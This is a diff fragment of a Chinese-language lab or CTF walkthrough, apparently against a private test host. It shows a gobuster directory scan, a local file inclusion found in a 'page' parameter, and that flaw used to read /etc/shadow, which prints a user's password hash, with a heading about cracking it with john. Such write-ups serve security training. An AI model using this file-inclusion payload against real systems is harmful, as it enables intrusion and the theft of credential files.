@@ -22,3 +22,14 @@
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.44.147 -x php,html.txt.png -e
 ```
 
+```c
+http://192.168.44.147/building   
+在这个页面随便点个home
+发现这个页面可能存在文件包含http://192.168.44.147/building/index.php?page=home.php
+初次尝试得到结果
+http://192.168.44.147/building/index.php?page=/etc/shadow
+
+
+jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7::: 
+```
+# john爆破
